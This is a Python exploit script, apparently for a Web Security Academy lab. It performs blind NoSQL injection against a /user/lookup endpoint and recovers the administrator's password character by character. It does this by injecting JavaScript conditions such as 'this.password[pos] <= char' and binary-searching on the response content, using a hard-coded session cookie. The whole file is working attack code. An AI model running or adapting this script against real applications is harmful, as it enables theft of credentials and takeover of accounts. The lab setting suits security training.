import requests
import urllib.parse

# Configuration
BASE_URL = 'https://0a6e00ee03375d0485a0aab600db0066.web-security-academy.net'
SESSION_COOKIE = 'iwk5vTzS84y087h9zzDZbfgWFrXxDQ0t'

# Suppress SSL warnings
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
charset = ''.join([chr(i) for i in range(32, 127)])  # Full printable ASCII

def send_request(injection_payload):
    """Send request with the injection payload and return full response details"""
    
    # Build the full injection string
    full_injection = f"administrator' && {injection_payload} || 'a'=='b"
    
    # URL encode it
    encoded = urllib.parse.quote(full_injection, safe='')
    
    # Build full URL
    url = f'{BASE_URL}/user/lookup?user={encoded}'
    
    # Headers
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.9',
        'Sec-Ch-Ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'Sec-Ch-Ua-Mobile': '?0',
        'Sec-Ch-Ua-Platform': '"Windows"',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
        'Referer': f'{BASE_URL}/my-account?id=wiener',
        'Accept-Encoding': 'gzip, deflate, br',
        'Priority': 'u=1, i'
    }
    
    # Cookies
    cookies = {
        'session': SESSION_COOKIE
    }
    
    # Make request
    response = requests.get(url, headers=headers, cookies=cookies, verify=False)

    # Print everything
    print("\n" + "="*60)
    print(f"PAYLOAD: {injection_payload}")
    print(f"FULL INJECTION: {full_injection}")
    print(f"URL: {url}")
    print("-"*60)
    print(f"STATUS CODE: {response.status_code}")
    print(f"RESPONSE LENGTH: {len(response.text)} bytes")
    print(f"RESPONSE HEADERS: {dict(response.headers)}")
    print("-"*60)
    print("RESPONSE BODY:")
    print(response.text[:1000])  # First 1000 chars
    if len(response.text) > 1000:
        print(f"... (truncated, total {len(response.text)} bytes)")
    print("="*60)

    return response


def find_password_length():
    mid = 10
    low = 0
    high = float("inf")
    while high == float("inf"):
        response = send_request(f"this.password.length <= {mid}")
        print(response.text)
        if ".net" in response.text:
            high = mid
        else:
            low = mid
            mid *= 2
    while low + 1 < high:
        mid = (low + high) // 2
        response = send_request(f"this.password.length <= {mid}")
        if ".net" in response.text:
            high = mid
        else:
            low = mid
    return high

def binary_search_char_at_pos(pos):
    low = 0
    high = len(charset) - 1

    while low + 1 < high:
        mid = (low + high) // 2
        mid_char = charset[mid]
        response = send_request(f"this.password[{pos}] <= '{mid_char}'")
        if ".net" in response.text:
            high = mid
        else:
            low = mid
    return charset[high]

def find_password(length):
    password = ""
    for i in range(length):
        password += binary_search_char_at_pos(i)
    return password


print("finding password length")
length = find_password_length()
print(f"password length is {length}")
print("finding password")
password = find_password(length)
print(f"password is {password}")